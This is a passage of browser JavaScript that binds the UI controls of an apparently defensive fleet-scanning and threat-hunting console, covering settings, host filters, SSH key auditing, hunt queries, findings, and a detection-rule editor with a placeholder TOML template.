        });
        if (id === "users" && state.authUser?.role === "admin") {
          loadAuthUsers().then(() => {
            if (state._settingsTab === "users") render();
          });
        }
      });
    });
    const exportBtn = $("#btnExportSettings");
    if (exportBtn) exportBtn.addEventListener("click", downloadSettings);
    const copyBtn = $("#btnCopySettings");
    if (copyBtn) copyBtn.addEventListener("click", () => copySettings().catch(() => {}));
    const reloadBtn = $("#btnReloadSettings");
    if (reloadBtn) {
      reloadBtn.addEventListener("click", async () => {
        try {
          state.settings = await api("/v1/settings");
          toast("Settings reloaded");
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const reloadVer = $("#btnReloadVersion");
    if (reloadVer) {
      reloadVer.addEventListener("click", async () => {
        try {
          state.version = await api("/v1/version");
          toast("Version digests refreshed");
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const hostPick = $("#hostSettingsPick");
    if (hostPick) {
      hostPick.addEventListener("change", () => {
        state._settingsHostId = hostPick.value || "";
        const wrap = $("#hostSettingsFormWrap");
        if (wrap) wrap.innerHTML = hostSettingsFormHtml(state._settingsHostId);
        wireHostSettingsForm();
      });
    }
    wireHostSettingsForm();
    wireAuthSettings();
    wireDataPage();
    wireFleetSift();
    wireAnoMark();
    const btnVa = $("#btnVirtualHost");
    if (btnVa) btnVa.addEventListener("click", () => showCreateVirtualHost());
    const btnTree = $("#btnImportTree");
    if (btnTree) btnTree.addEventListener("click", () => showImportTree());
    wireVirtualAgentSettings();
    $$("[data-copy-ingest]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        e.stopPropagation();
        const tok = btn.getAttribute("data-copy-ingest") || "";
        try {
          await navigator.clipboard.writeText(tok);
          toast(tok ? "Ingest token copied" : "No ingest token");
        } catch (_) {
          toast(tok || "No token");
        }
      });
    });
    $$("[data-feed-virtual]").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        showFeedVirtualHost(
          btn.getAttribute("data-feed-virtual"),
          btn.getAttribute("data-feed-name") || ""
        );
      });
    });
    const histForm = $("#fleetScanHistoryForm");
    if (histForm) {
      histForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const fd = new FormData(histForm);
        const n = Number(fd.get("scan_history_per_host") || 3);
        try {
          state.settings = await api("/v1/settings", {
            method: "PUT",
            body: { scan_history_per_host: n },
          });
          toast(`Scan history set to ${n} per host`);
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const healthForm = $("#hostHealthForm");
    if (healthForm) {
      healthForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const fd = new FormData(healthForm);
        const body = {
          host_health: {
            enabled: fd.get("enabled") === "on",
            interval_secs: Number(fd.get("interval_secs") || 60),
            concurrency: Number(fd.get("concurrency") || 8),
            connect_timeout_secs: Number(fd.get("connect_timeout_secs") || 3),
          },
        };
        try {
          state.settings = await api("/v1/settings", { method: "PUT", body });
          toast("Host health settings saved");
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const probeForm = $("#probeLimitsForm");
    if (probeForm) {
      probeForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const fd = new FormData(probeForm);
        const mib = (name, fallback) => Math.round(Number(fd.get(name) || fallback) * 1048576);
        const body = {
          probe_limits: {
            max_rss_bytes: mib("max_rss_mib", 24),
            nice: Number(fd.get("nice") || 19),
            max_transfer_bps: Math.round(Number(fd.get("max_transfer_kibps") || 0) * 1024),
            max_open_files: Number(fd.get("max_open_files") || 256),
            max_observations: Number(fd.get("max_observations") || 500000),
            max_output_bytes: mib("max_output_mib", 64),
            max_files_examined: Number(fd.get("max_files_examined") || 2000000),
            max_cpu_pct: Number(fd.get("max_cpu_pct") || 0),
            io_idle: fd.get("io_idle") === "on",
          },
        };
        try {
          state.settings = await api("/v1/settings", { method: "PUT", body });
          toast("Agent limits saved");
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    $$("[data-copy-sha]").forEach((btn) => {
      btn.addEventListener("click", async () => {
        const sha = btn.getAttribute("data-copy-sha") || "";
        try {
          await navigator.clipboard.writeText(sha);
          toast("SHA-256 copied");
        } catch (_) {
          toast(sha);
        }
      });
    });
    $$("[data-goto]").forEach((b) => b.addEventListener("click", () => setView(b.dataset.goto)));
    $$("[data-fid]").forEach((tr) => {
      tr.addEventListener("click", (e) => {
        if (e.target.closest("a, button, [data-stop]")) return;
        const id = tr.getAttribute("data-fid");
        openFindingById(id, { skipView: state.view === "findings" });
      });
    });
    $$("[data-fid-link]").forEach((a) => {
      a.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        openFindingById(a.getAttribute("data-fid-link"), { skipView: state.view === "findings" });
      });
    });
    $$("[data-copy-finding]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        e.stopPropagation();
        const url = btn.getAttribute("data-copy-finding") || "";
        try {
          await navigator.clipboard.writeText(url);
          toast("Finding link copied");
        } catch (_) {
          toast(url);
        }
      });
    });
    $$("[data-copy-host-link]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.preventDefault();
        e.stopPropagation();
        const url = btn.getAttribute("data-copy-host-link") || "";
        try {
          await navigator.clipboard.writeText(url);
          toast("Host link copied");
        } catch (_) {
          toast(url);
        }
      });
    });
    $$("[data-goto-host]").forEach((el) => {
      el.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        const hid = el.getAttribute("data-goto-host");
        if (hid) openHostById(hid).catch((err) => toast(err.message));
      });
    });
    $$("[data-open-scan]").forEach((el) => {
      el.addEventListener("click", (e) => {
        if (e.target.closest("a") && el.tagName !== "A" && !el.hasAttribute("data-open-scan")) return;
        e.preventDefault();
        e.stopPropagation();
        const sid = el.getAttribute("data-open-scan");
        if (sid) openScanById(sid).catch((err) => toast(err.message));
      });
    });
    $$("[data-page]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const which = btn.dataset.page;
        const dir = Number(btn.dataset.dir || 0);
        if (which === "host") state.hostPage = Math.max(0, state.hostPage + dir);
        if (which === "find") state.findPage = Math.max(0, state.findPage + dir);
        if (which === "scan") state.scanPage = Math.max(0, state.scanPage + dir);
        render();
      });
    });
    const hostQ = $("#hostQ");
    const hostEnv = $("#hostEnv");
    const hostProfile = $("#hostProfile");
    const hostPreset = $("#hostPreset");
    const hostAgent = $("#hostAgent");
    const hostOs = $("#hostOs");
    const hostArch = $("#hostArch");
    const applyHostFilters = (opts = {}) => {
      const live = $("#hostQ");
      if (live) state._hostQ = live.value || "";
      const envEl = $("#hostEnv") || hostEnv;
      const profileEl = $("#hostProfile") || hostProfile;
      const presetEl = $("#hostPreset") || hostPreset;
      const agentEl = $("#hostAgent") || hostAgent;
      const osEl = $("#hostOs") || hostOs;
      const archEl = $("#hostArch") || hostArch;
      if (envEl) state._hostEnv = envEl.value || "";
      if (profileEl) state._hostProfile = profileEl.value || "";
      if (presetEl) state._hostPreset = presetEl.value || "";
      if (agentEl) state._hostAgent = agentEl.value || "";
      if (osEl) state._hostOs = osEl.value || "";
      if (archEl) state._hostArch = archEl.value || "";
      state.hostPage = 0;
      const keepFocus = opts.keepFocus !== false && live && document.activeElement === live;
      const start = keepFocus ? live.selectionStart : null;
      const end = keepFocus ? live.selectionEnd : null;
      render();
      if (keepFocus) {
        const el = $("#hostQ");
        if (el) {
          el.focus();
          try {
            if (start != null) el.setSelectionRange(start, end ?? start);
          } catch (_) {}
        }
      }
    };
    if (hostQ) {
      hostQ.addEventListener("input", () => {
        state._hostQ = hostQ.value || "";
        clearTimeout(_hostFilterTimer);
        _hostFilterTimer = window.setTimeout(() => applyHostFilters({ keepFocus: true }), 140);
      });
      hostQ.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          clearTimeout(_hostFilterTimer);
          applyHostFilters({ keepFocus: true });
        }
      });
    }
    const onHostSelectChange = () => applyHostFilters({ keepFocus: false });
    if (hostEnv) hostEnv.addEventListener("change", onHostSelectChange);
    if (hostProfile) hostProfile.addEventListener("change", onHostSelectChange);
    if (hostPreset) hostPreset.addEventListener("change", onHostSelectChange);
    if (hostAgent) hostAgent.addEventListener("change", onHostSelectChange);
    if (hostOs) hostOs.addEventListener("change", onHostSelectChange);
    if (hostArch) hostArch.addEventListener("change", onHostSelectChange);

    $$("[data-host]").forEach((tr) => {
      tr.addEventListener("click", () => setView("hosts"));
    });
    $$("[data-host-row]").forEach((tr) => {
      tr.addEventListener("click", (e) => {
        if (e.target.closest("[data-stop], a, button")) return;
        openHostById(tr.getAttribute("data-host-row")).catch((err) => toast(err.message));
      });
    });
    $$("[data-host-detail]").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        openHostById(btn.dataset.hostDetail || btn.getAttribute("data-host-detail")).catch((err) => toast(err.message));
      });
    });
    $$("[data-scan]").forEach((tr) => {
      tr.addEventListener("click", (e) => {
        if (e.target.closest("a, button, [data-stop]")) return;
        const sid = tr.getAttribute("data-scan");
        if (sid) openScanById(sid).catch((err) => toast(err.message));
      });
    });
    $$("[data-host-check]").forEach((cb) => {
      cb.addEventListener("click", (e) => e.stopPropagation());
      cb.addEventListener("change", () => {
        const sel = selectedHostIds();
        if (cb.checked) sel.add(cb.dataset.hostCheck);
        else sel.delete(cb.dataset.hostCheck);
        setSelectedHosts(sel);
        render();
      });
    });
    const checkAll = $("#hostCheckAll");
    if (checkAll) {
      checkAll.addEventListener("change", () => {
        const sel = selectedHostIds();
        const pageIds = $$("[data-host-check]").map((cb) => cb.dataset.hostCheck);
        if (checkAll.checked) pageIds.forEach((id) => sel.add(id));
        else pageIds.forEach((id) => sel.delete(id));
        setSelectedHosts(sel);
        render();
      });
    }
    const btnSelectPage = $("#btnHostSelectPage");
    if (btnSelectPage) {
      btnSelectPage.addEventListener("click", () => {
        const pageIds = $$("[data-host-check]").map((cb) => cb.dataset.hostCheck);
        const sel = selectedHostIds();
        const allSelected = pageIds.length && pageIds.every((id) => sel.has(id));
        if (allSelected) pageIds.forEach((id) => sel.delete(id));
        else pageIds.forEach((id) => sel.add(id));
        setSelectedHosts(sel);
        render();
      });
    }
    const btnScanSelected = $("#btnScanSelected");
    if (btnScanSelected) {
      btnScanSelected.addEventListener("click", () => showScanHosts([...selectedHostIds()]));
    }
    const btnTagSelected = $("#btnTagSelected");
    if (btnTagSelected) btnTagSelected.addEventListener("click", showTagSelected);
    const btnExportHosts = $("#btnExportHosts");
    if (btnExportHosts) btnExportHosts.addEventListener("click", exportHostsCsv);
    const btnDeleteSelected = $("#btnDeleteSelected");
    if (btnDeleteSelected) {
      btnDeleteSelected.addEventListener("click", () => deleteHosts([...selectedHostIds()]));
    }
    wireHostActionButtons(document);
    $$("[data-test-host]").forEach((btn) => {
      btn.addEventListener("click", async (e) => {
        e.stopPropagation();
        const h = state.hosts.find((x) => x.id === btn.dataset.testHost);
        if (!h) return;
        openModal(`Test ${h.display_name}`, `
          <div id="hostTestResult"><div class="muted">Starting…</div></div>
          <div class="form-actions">
            <button type="button" class="btn ghost" data-close-modal>Close</button>
          </div>
        `);
        try {
          const report = await runHostConnectionTest({
            host: h.primary_addr || h.display_name,
            ssh_port: h.ssh_port || 22,
            username: h.labels?.ssh_user || null,
            auth_method: h.labels?.ssh_auth
              || (h.labels?.ssh_password_file ? "password" : "publickey"),
            identity: h.labels?.ssh_identity || null,
            password_file: h.labels?.ssh_password_file || null,
            require_auth: true,
            host_id: h.id,
            connect_timeout_secs: 8,
          }, $("#hostTestResult"));
          toast(report.ok ? "Test passed" : `Test: ${report.auth_status}`);
          await loadAll();
        } catch (err) {
          $("#hostTestResult").innerHTML = `<div class="conn-test bad">${esc(err.message)}</div>`;
          toast(err.message);
        }
      });
    });
    const add = $("#btnAddHost");
    if (add) add.addEventListener("click", showAddHost);

    // SSH Hunter bindings
    const applySshKeyFilters = () => {
      state._sshKeyQ = $("#sshKeyQ")?.value || "";
      state._sshKeyTag = $("#sshKeyTag")?.value || "";
      state._sshKeyReused = !!$("#sshKeyReused")?.checked;
      state._sshKeyWeak = !!$("#sshKeyWeak")?.checked;
      render();
    };
    const sshKeyQ = $("#sshKeyQ");
    if (sshKeyQ) sshKeyQ.addEventListener("keydown", (e) => { if (e.key === "Enter") applySshKeyFilters(); });
    ["sshKeyTag", "sshKeyReused", "sshKeyWeak"].forEach((id) => {
      const el = document.getElementById(id);
      if (el) el.addEventListener("change", applySshKeyFilters);
    });
    const sshUserQ = $("#sshUserQ");
    if (sshUserQ) {
      sshUserQ.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          state._sshUserQ = sshUserQ.value || "";
          render();
        }
      });
    }
    const sshHostQ = $("#sshHostQ");
    if (sshHostQ) {
      sshHostQ.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          state._sshHostQ = sshHostQ.value || "";
          render();
        }
      });
    }
    $$("[data-ssh-key-detail]").forEach((b) => {
      b.addEventListener("click", (e) => {
        e.stopPropagation();
        showSshKeyDetail(b.dataset.sshKeyDetail);
      });
    });
    $$("[data-ssh-check]").forEach((cb) => {
      cb.addEventListener("click", (e) => e.stopPropagation());
      cb.addEventListener("change", () => {
        const sel = selectedSshKeys();
        if (cb.checked) sel.add(cb.dataset.sshCheck);
        else sel.delete(cb.dataset.sshCheck);
        setSelectedSshKeys(sel);
        render();
      });
    });
    $$("[data-ssh-filter-tag]").forEach((b) => {
      b.addEventListener("click", () => {
        state._sshKeyTag = b.dataset.sshFilterTag;
        render();
      });
    });
    const btnAddZone = $("#btnAddSshZone");
    if (btnAddZone) btnAddZone.addEventListener("click", showAddSshZone);
    $$("[data-del-zone]").forEach((b) => {
      b.addEventListener("click", async () => {
        if (!window.confirm("Delete this security zone?")) return;
        try {
          await api(`/v1/ssh/zones/${b.dataset.delZone}`, { method: "DELETE" });
          toast("Zone deleted");
          await loadSshHunter();
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    });
    const btnBulkTag = $("#btnSshBulkTag");
    if (btnBulkTag) btnBulkTag.addEventListener("click", showBulkTagSsh);
    const btnSelectVisible = $("#btnSshSelectVisible");
    if (btnSelectVisible) {
      btnSelectVisible.addEventListener("click", () => {
        const sel = selectedSshKeys();
        $$("[data-ssh-check]").forEach((cb) => sel.add(cb.dataset.sshCheck));
        setSelectedSshKeys(sel);
        render();
      });
    }
    const btnSshGraphRefresh = $("#btnSshGraphRefresh");
    if (btnSshGraphRefresh) {
      btnSshGraphRefresh.addEventListener("click", async () => {
        try {
          await loadSshHunter();
          toast("SSH graph refreshed");
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    mountSshForceGraphs();

    const actLevel = $("#actLevel");
    if (actLevel) {
      actLevel.addEventListener("change", () => {
        state._actLevel = actLevel.value;
        render();
      });
    }
    const btnActRefresh = $("#btnActRefresh");
    if (btnActRefresh) {
      btnActRefresh.addEventListener("click", () => loadLive().catch((e) => toast(e.message)));
    }

    if (state.view === "hunt") {
      ensureRplFields().catch(() => {});
    }

    $$("[data-rpl-tab]").forEach((b) => {
      b.addEventListener("click", () => {
        snapshotRplForm();
        state._rplTab = b.dataset.rplTab;
        render();
      });
    });

    const rplFieldFilter = $("#rplFieldFilter");
    if (rplFieldFilter) {
      rplFieldFilter.addEventListener("input", () => {
        state._rplFieldFilter = rplFieldFilter.value;
        const list = $("#rplFieldList");
        if (list) {
          list.innerHTML = renderRplFieldListHtml(state._rplFields || [], state._rplFieldFilter);
          bindRplFieldButtons(list);
        }
      });
    }

    bindRplFieldButtons();

    const rplSaveQuery = $("#rplSaveQuery");
    if (rplSaveQuery) {
      rplSaveQuery.addEventListener("click", () => {
        snapshotRplForm();
        const query = (state._rplQuery || "").trim();
        if (!query) return toast("Nothing to save");
        const name = window.prompt("Saved query name", query.slice(0, 40));
        if (name == null) return;
        loadRplSaved();
        state._rplSaved.unshift({ name: name.trim() || query.slice(0, 40), query });
        state._rplSaved = state._rplSaved.slice(0, 40);
        persistRplSaved();
        render();
        toast("Query saved");
      });
    }

    $$("[data-rpl-load]").forEach((b) => {
      b.addEventListener("click", () => {
        const item = loadRplSaved()[Number(b.dataset.rplLoad)];
        if (!item) return;
        snapshotRplForm();
        state._rplQuery = item.query;
        state._rplTab = "results";
        render();
      });
    });

    $$("[data-rpl-del]").forEach((b) => {
      b.addEventListener("click", () => {
        snapshotRplForm();
        loadRplSaved();
        state._rplSaved.splice(Number(b.dataset.rplDel), 1);
        persistRplSaved();
        render();
      });
    });

    $$("[data-rpl-viz]").forEach((b) => {
      b.addEventListener("click", () => {
        snapshotRplForm();
        state._rplPanelViz = b.dataset.rplViz;
        render();
      });
    });

    const rplSqlDetails = $("#rplSqlDetails");
    if (rplSqlDetails) {
      rplSqlDetails.addEventListener("toggle", () => {
        state._rplSqlOpen = rplSqlDetails.open;
      });
    }

    $$("[data-rpl-row]").forEach((tr) => {
      tr.addEventListener("click", () => {
        snapshotRplForm();
        state._rplSelected = Number(tr.dataset.rplRow);
        render();
      });
    });

    async function runRplQuery(query, opts = {}) {
      const q = String(query || "").trim();
      if (!q) return toast("Enter an RPL query");
      state._rplQuery = q;
      state._rplTab = "results";
      const time_from = opts.time_from ?? state._rplTimeFrom ?? "";
      const time_to = opts.time_to ?? state._rplTimeTo ?? "";
      const limit = Number(opts.limit ?? state._rplLimit ?? 200) || 200;
      state._rplTimeFrom = time_from;
      state._rplTimeTo = time_to;
      state._rplLimit = limit;
      const body = { query: q, limit };
      if (time_from) body.time_from = time_from;
      if (time_to) body.time_to = time_to;
      const t0 = performance.now();
      try {
        const [res, hist] = await Promise.all([
          api("/v1/hunt/rpl", { method: "POST", body }),
          api("/v1/hunt/rpl/histogram", {
            method: "POST",
            body: {
              query: q,
              ...(time_from ? { time_from } : {}),
              ...(time_to ? { time_to } : {}),
              span_minutes: 60,
            },
          }).catch(() => null),
        ]);
        state._rplElapsed = Math.round(performance.now() - t0);
        state._rplResult = res;
        state._rplHist = hist;
        state._rplSelected = 0;
        state._rplPanelViz = res.viz === "stats" ? "bar" : (res.viz || "table");
        render();
      } catch (err) {
        toast(err.message);
      }
    }

    $$("[data-rpl-ex]").forEach((b) => {
      b.addEventListener("click", () => {
        state._rplQuery = b.dataset.rplEx;
        const ta = $("#rplQuery");
        if (ta) ta.value = b.dataset.rplEx;
        else {
          snapshotRplForm();
          render();
        }
      });
    });

    $$("[data-rpl-run]").forEach((b) => {
      b.addEventListener("click", () => runRplQuery(b.dataset.rplRun));
    });

    $$("[data-rpl-copy]").forEach((b) => {
      b.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(b.dataset.rplCopy || "");
          toast("Copied");
        } catch (_) {
          toast("Copy failed");
        }
      });
    });

    const rplForm = $("#rplHuntForm");
    if (rplForm) {
      rplForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const fd = new FormData(rplForm);
        await runRplQuery(fd.get("query"), {
          time_from: String(fd.get("time_from") || "").trim(),
          time_to: String(fd.get("time_to") || "").trim(),
          limit: Number(fd.get("limit") || 200),
        });
      });
    }

    const rplCompile = $("#rplCompile");
    if (rplCompile) {
      rplCompile.addEventListener("click", async () => {
        const ta = $("#rplQuery");
        const query = (ta?.value || state._rplQuery || "").trim();
        if (!query) return toast("Enter an RPL query");
        const fd = rplForm ? new FormData(rplForm) : null;
        const body = {
          query,
          limit: Number(fd?.get("limit") || state._rplLimit || 200),
        };
        const tf = String(fd?.get("time_from") || state._rplTimeFrom || "").trim();
        const tt = String(fd?.get("time_to") || state._rplTimeTo || "").trim();
        if (tf) body.time_from = tf;
        if (tt) body.time_to = tt;
        try {
          const res = await api("/v1/hunt/rpl/compile", { method: "POST", body });
          state._rplQuery = query;
          state._rplResult = {
            ...(state._rplResult || {}),
            sql: res.sql,
            engine: state._rplResult?.engine || "compile",
            viz: res.has_timechart ? "timechart" : state._rplResult?.viz || "table",
            rows: state._rplResult?.rows || [],
            count: state._rplResult?.count ?? 0,
            columns: state._rplResult?.columns || [],
          };
          state._rplSqlOpen = true;
          render();
          toast(res.has_timechart ? "Compiled (timechart)" : "Compiled");
        } catch (err) {
          toast(err.message);
        }
      });
    }

    const huntForm = $("#huntForm");
    if (huntForm) {
      huntForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const fd = new FormData(huntForm);
        state._exprWhere = String(fd.get("where_expr") || "");
        const body = {
          match_on: fd.get("match_on"),
          where_expr: fd.get("where_expr"),
          limit: 200,
        };
        const host = String(fd.get("host") || "").trim();
        if (host) body.host = host;
        try {
          const hits = await api("/v1/hunt", { method: "POST", body });
          state._exprResultsHtml = hits.length
            ? `<div class="muted" style="margin-bottom:0.5rem">${hits.length} hit(s)</div>` +
              findingsTable(hits.map((h, i) => ({
                id: `hunt-${i}`,
                title: h.title,
                check_id: h.check_id,
                severity: h.severity,
                confidence: h.confidence,
                host_id: "—",
                attack: h.attack || [],
                evidence: h.evidence || {},
              })))
            : `<div class="empty">No matches</div>`;
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const findQ = $("#findQ");
    const findSev = $("#findSev");
    const findHost = $("#findHost");
    const findTag = $("#findTag");
    const findCheck = $("#findCheck");
    const findGroup = $("#findGroup");
    const applyFindFilters = (opts) => {
      const keepFocus = opts && opts.keepFocus;
      const focusId = opts && opts.focusId;
      state._findQ = findQ?.value || "";
      state._findSev = findSev?.value || "";
      state._findHost = findHost?.value || "";
      state._findTag = findTag?.value || "";
      state._findCheck = findCheck?.value || "";
      state._findGroup = findGroup?.value || "alert";
      if (!opts || opts.resetPage !== false) state.findPage = 0;
      render();
      if (keepFocus && focusId) {
        const el = document.getElementById(focusId);
        if (el && typeof el.focus === "function") {
          el.focus();
          if (el.setSelectionRange && typeof el.value === "string") {
            const n = el.value.length;
            try { el.setSelectionRange(n, n); } catch (_) {}
          }
        }
      }
    };
    if (findQ) {
      findQ.addEventListener("keydown", (e) => {
        if (e.key === "Enter") applyFindFilters({ keepFocus: true, focusId: "findQ" });
      });
      let findQTimer = null;
      findQ.addEventListener("input", () => {
        clearTimeout(findQTimer);
        findQTimer = setTimeout(
          () => applyFindFilters({ keepFocus: true, focusId: "findQ" }),
          220
        );
      });
    }
    [findSev, findHost, findTag, findCheck, findGroup].forEach((el) => {
      if (el) el.addEventListener("change", () => applyFindFilters());
    });
    $$("[data-find-sev]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const v = btn.getAttribute("data-find-sev") || "";
        state._findSev = state._findSev === v ? "" : v;
        state.findPage = 0;
        render();
      });
    });
    $("#btnFindClear")?.addEventListener("click", () => {
      state._findQ = "";
      state._findSev = "";
      state._findHost = "";
      state._findTag = "";
      state._findCheck = "";
      state._findGroup = "alert";
      state._findExpanded = {};
      state.findPage = 0;
      render();
    });
    $$("[data-toggle-find-group]").forEach((btn) => {
      btn.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        const key = btn.getAttribute("data-toggle-find-group") || "";
        if (!key) return;
        state._findExpanded = { ...(state._findExpanded || {}) };
        state._findExpanded[key] = !state._findExpanded[key];
        render();
      });
    });

    const checkQ = $("#checkQ");
    if (checkQ) {
      checkQ.addEventListener("input", () => {
        state.checkQuery = checkQ.value;
        // Re-filter list without full remount of editor when possible
        render();
        const again = $("#checkQ");
        if (again) {
          again.focus();
          const v = again.value;
          again.setSelectionRange(v.length, v.length);
        }
      });
    }
    ["checkTypeFilter", "checkSevFilter", "checkEnabledFilter"].forEach((id) => {
      const el = $(`#${id}`);
      if (!el) return;
      el.addEventListener("change", () => {
        if (id === "checkTypeFilter") state.checkTypeFilter = el.value;
        if (id === "checkSevFilter") state.checkSevFilter = el.value;
        if (id === "checkEnabledFilter") state.checkEnabledFilter = el.value;
        render();
      });
    });
    $$("[data-rule-id]").forEach((btn) => {
      btn.addEventListener("click", () => selectRule(btn.getAttribute("data-rule-id")));
    });
    const reloadCat = $("#btnReloadChecks");
    if (reloadCat) {
      reloadCat.addEventListener("click", async () => {
        try {
          await api("/v1/checks/reload", { method: "POST", body: {} });
          await refreshChecksCatalog();
          toast("Rules catalog reloaded");
          render();
        } catch (e) {
          toast(e.message);
        }
      });
    }
    function showNewRuleDrawer() {
      const existing = new Set((state.checks || []).map((c) => c.id));
      let n = 1;
      let suggest = `RM-CUSTOM-${String(n).padStart(4, "0")}`;
      while (existing.has(suggest)) {
        n += 1;
        suggest = `RM-CUSTOM-${String(n).padStart(4, "0")}`;
      }
      const template = `id = "${suggest}"
version = 1
name = "New custom rule"
type = "process"
severity = "medium"
confidence = "medium"
enabled = true
cost = "trivial"
match = "process"
where = '''
  process.name == "example"
'''
title = "Custom rule matched process {{process.name}}"
evidence_fields = ["name", "pid", "exe"]
attack = []
rationale = "Describe why this is suspicious."
false_positives = "Known benign cases."

[test]
fires_on = ["hostile-catalog"]
silent_on = ["clean-ubuntu2204"]
source = "collector"

[test.expect]
title_contains = "Custom rule"
`;
      openDrawer("New rule", `
        <form class="form" id="newRuleForm">
          <label>Rule id
            <input name="id" class="mono" required pattern="[A-Za-z0-9._-]+" value="${esc(suggest)}" />
          </label>
          <label>TOML
            <textarea name="toml" id="newRuleToml" class="rules-editor" rows="18" spellcheck="false">${esc(template)}</textarea>
          </label>
          <p class="muted" style="font-size:0.82rem;margin:0">Creates <span class="mono">checks/{id}.toml</span>. Validate with the workbench after create.</p>
          <div class="form-actions">
            <button type="submit" class="btn primary">Create</button>
            <button type="button" class="btn ghost" data-close-drawer>Cancel</button>
          </div>
        </form>
      `);
      const form = $("#newRuleForm");
      const idInput = form?.querySelector('input[name="id"]');
      const tomlTa = $("#newRuleToml");
      idInput?.addEventListener("input", () => {
        if (!tomlTa) return;
        const id = idInput.value.trim();
        tomlTa.value = tomlTa.value.replace(/^id\s*=\s*"[^"]*"/m, `id = "${id}"`);
      });
      form?.addEventListener("submit", async (e) => {
        e.preventDefault();
        const fd = new FormData(form);
        let toml = String(fd.get("toml") || "");
        const id = String(fd.get("id") || "").trim();
        if (!id) {
          toast("Rule id required");
          return;
        }
        if (!/^id\s*=/m.test(toml)) {
          toml = `id = "${id}"\n${toml}`;
        } else {
          toml = toml.replace(/^id\s*=\s*"[^"]*"/m, `id = "${id}"`);
        }
        try {
          const created = await api("/v1/checks", { method: "POST", body: { toml } });
          await refreshChecksCatalog();
          closeDrawer();
          await selectRule(created.id);
          toast(`Created ${created.id}`);
        } catch (err) {
          toast(err.message);
        }
      });
      $$("[data-close-drawer]").forEach((b) => b.addEventListener("click", () => closeDrawer()));
    }
    ["#btnNewRule", "#btnNewRuleEmpty"].forEach((sel) => {
      const btn = $(sel);
      if (btn) btn.addEventListener("click", () => showNewRuleDrawer());
    });
    const deleteRule = $("#btnDeleteRule");
    if (deleteRule && state.selectedCheckId) {
      deleteRule.addEventListener("click", async () => {
        const id = state.selectedCheckId;
        if (!window.confirm(`Delete rule ${id}? This removes checks/${id}.toml from disk.`)) return;
        try {
          await api(`/v1/checks/${encodeURIComponent(id)}`, { method: "DELETE" });
          state.selectedCheckId = null;
          state.checkDetail = null;
          state._ruleSandbox = null;
          await refreshChecksCatalog();
          toast(`Deleted ${id}`);
          render();
        } catch (e) {
          toast(e.message);
        }
      });
    }
    const enabledEl = $("#ruleEnabled");
    if (enabledEl && state.selectedCheckId) {
      enabledEl.addEventListener("change", async () => {
        try {
          state.checkDetail = await api(`/v1/checks/${encodeURIComponent(state.selectedCheckId)}`, {
            method: "PATCH",
            body: { enabled: !!enabledEl.checked },
          });
          await refreshChecksCatalog();
          toast(enabledEl.checked ? "Rule enabled" : "Rule disabled");
          render();
        } catch (e) {
          toast(e.message);
          enabledEl.checked = !enabledEl.checked;
        }
      });
    }
    $$("[data-scan-set]").forEach((box) => {
      box.addEventListener("change", async () => {
        const setId = box.getAttribute("data-scan-set");
        try {
          state.checkDetail = await api(`/v1/checks/${encodeURIComponent(state.selectedCheckId)}`, {
            method: "PATCH",
            body: { scan_sets: { [setId]: !!box.checked } },
          });
          state.checkSets = await api("/v1/check-sets").catch(() => state.checkSets);
          await refreshChecksCatalog();
          toast(`${setId} ${box.checked ? "on" : "off"} for ${state.selectedCheckId}`);
          render();
        } catch (e) {
          toast(e.message);
          box.checked = !box.checked;
        }
      });
    });
    const saveBtn = $("#btnSaveRule");
    if (saveBtn) {
      saveBtn.addEventListener("click", async () => {
        const ta = $("#ruleTomlEditor");
        if (!ta || !state.selectedCheckId) return;
        try {
          state.checkDetail = await api(`/v1/checks/${encodeURIComponent(state.selectedCheckId)}`, {
            method: "PUT",
            body: { toml: ta.value },
          });
          await refreshChecksCatalog();
          toast("Rule saved");
          render();
        } catch (e) {
          toast(e.message);
        }
      });
    }
    const applyAnomark = $("#btnApplyAnoMarkRule");
    if (applyAnomark) {
      applyAnomark.addEventListener("click", () => {
        const ta = $("#ruleTomlEditor");
        if (!ta) return;
        const model = ($("#ruleAnomarkModel")?.value || "").trim();
        const suspect = Number($("#ruleAnomarkSuspect")?.value || 95);
        const maxCmd = Number($("#ruleAnomarkMax")?.value || 5000);
        const tags = String($("#ruleAnomarkTags")?.value || "")
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean);
        const tagsToml = tags.length
          ? `tags = [${tags.map((t) => JSON.stringify(t)).join(", ")}]`
          : "tags = []";
        const block = `[anomark]\nmodel_id = ${JSON.stringify(model)}\nsuspect_percent = ${suspect}\n${tagsToml}\nmax_commands = ${maxCmd}\n`;
        let text = ta.value;
        if (/^\[anomark\]/m.test(text)) {
          text = text.replace(/^\[anomark\][\s\S]*?(?=^\[|\z)/m, block);
        } else {
          text = `${text.trimEnd()}\n\n${block}`;
        }
        ta.value = text;
        const hl = $("#ruleTomlHighlight");
        if (hl && typeof highlightToml === "function") hl.innerHTML = highlightToml(text);
        toast("AnoMark options applied to TOML — click Save TOML");
      });
